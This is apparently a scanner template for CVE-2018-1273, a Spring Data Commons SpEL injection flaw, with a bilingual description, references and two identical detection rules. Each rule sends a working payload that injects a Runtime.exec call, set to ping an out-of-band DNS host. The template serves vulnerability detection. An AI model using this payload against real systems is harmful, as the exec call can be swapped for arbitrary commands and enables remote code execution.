id: CVE-2018-1273

info:
  name: Spring Data Commons - Remote Code Execution
  author: dwisiswant0
  severity: critical
  verified: true
  description: |-
    Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。
    Spring Data Commons, versions prior to 1.13 to 1.13.10, 2.0 to 2.0.5,
    and older unsupported versions, contain a property binder vulnerability
    caused by improper neutralization of special elements.
    An unauthenticated remote malicious user (or attacker) can supply
    specially crafted request parameters against Spring Data REST backed HTTP resources
    or using Spring Data's projection-based request payload binding hat can lead to a remote code execution attack.
  reference:
    - https://github.com/vulhub/vulhub/tree/master/spring/CVE-2018-1273
    - https://nvd.nist.gov/vuln/detail/CVE-2018-1273
    - https://pivotal.io/security/cve-2018-1273
    - http://mail-archives.apache.org/mod_mbox/ignite-dev/201807.mbox/%3CCAK0qHnqzfzmCDFFi6c5Jok19zNkVCz5Xb4sU%3D0f2J_1i4p46zQ%40mail.gmail.com%3E
  tags: cve,cve2018,spring,spring-data,rce
  created: 2024/02/25

set:
  oob: oob()
  oobDNS: oob.DNS
  randstr: randomLowercase(5)
rules:
  r0:
    request:
      method: POST
      path: /users?page=&size=5
      body: |
        username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("ping {{oobDNS}}")]=&password=&repeatedPassword=
    expression: oobCheck(oob, oob.ProtocolDNS, 3)
  r1:
    request:
      method: POST
      path: /users?page=&size=5
      body: |
        username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("ping {{oobDNS}}")]=&password=&repeatedPassword=
    expression: oobCheck(oob, oob.ProtocolDNS, 3)
expression: r0() || r1()
